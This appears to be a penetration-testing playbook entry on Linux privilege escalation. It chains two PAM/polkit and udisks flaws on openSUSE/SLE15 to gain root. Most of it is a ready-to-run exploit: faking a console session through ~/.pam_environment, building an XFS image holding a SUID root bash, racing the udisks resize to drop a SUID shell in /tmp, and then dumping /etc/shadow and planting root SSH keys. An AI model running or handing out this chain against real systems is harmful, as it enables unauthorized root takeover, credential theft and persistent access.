---
id: linux-pam-polkit
title: Linux PAM / Polkit Privesc
stage: privesc
tags: [linux]
summary: Chain CVE-2025-6018 (fake console session via PAM) with CVE-2025-6019 (udisks XFS resize race) to plant an SUID root binary — specific to openSUSE/SLE15.
leads_to:
  - root-linux
---

## Prerequisites

openSUSE Leap 15 or SUSE Linux Enterprise 15 target (check `/etc/os-release`). SSH access as a normal user. No root or sudo required. Both CVEs are needed — 6018 gets you the polkit session, 6019 is the actual privilege boundary break.

These two CVEs chain together: polkit actions like udisks filesystem resize normally require an `allow_active` session (physical console login). openSUSE 15's PAM reads `~/.pam_environment` on login and trusts `XDG_SEAT`/`XDG_VTNR` from it — letting any user fake a console session (6018). With the faked session, a race window during XFS resize exposes a temporarily SUID-capable mount (6019).

## Quick Win

> Verify the distro, fake the PAM session, then run the XFS resize race.

```bash
cat /etc/os-release   # must show openSUSE Leap 15 or SLE15
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
# Log out and back in, then verify:
pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK
```

## CVE-2025-6018: Fake Console Session

> Write `XDG_SEAT` and `XDG_VTNR` to `~/.pam_environment` — PAM trusts these at login time.

```bash
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
# Log out and back in — .pam_environment is only read at session creation

# Confirm polkit now treats session as allow_active
pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK
```

## CVE-2025-6019: XFS Resize Race → SUID Root

> Build the XFS payload image on the attacker (use a bash binary from the target to avoid glibc mismatches).

```bash
# Build payload image on attacker host
dd if=/dev/zero of=payload.img bs=1M count=512
mkfs.xfs -f payload.img
sudo mkdir -p /mnt/xfs && sudo mount -o loop payload.img /mnt/xfs
sudo cp bash /mnt/xfs/rootbash && sudo chown root:root /mnt/xfs/rootbash
sudo chmod 6755 /mnt/xfs/rootbash
sudo umount /mnt/xfs
# Transfer payload.img to target
```

```bash
# On target — stop gvfs from auto-mounting before you can race it
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
udisksctl loop-setup -f /tmp/payload.img

# Trigger XFS resize (opens the race window)
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

# Race — copy SUID bash out during the window
while true; do
  for d in /tmp/blockdev.*; do
    [ -x "$d/rootbash" ] && "$d/rootbash" -p -c \
      'cp /bin/bash /tmp/pwned; chmod 4755 /tmp/pwned' 2>/dev/null && break 2
  done
done

/tmp/pwned -p
```

## Leads To

Race win → `/tmp/pwned -p` → root shell → root-linux. Dump `/etc/shadow`, plant authorized_keys in `/root/.ssh/`, check interfaces for additional subnets.
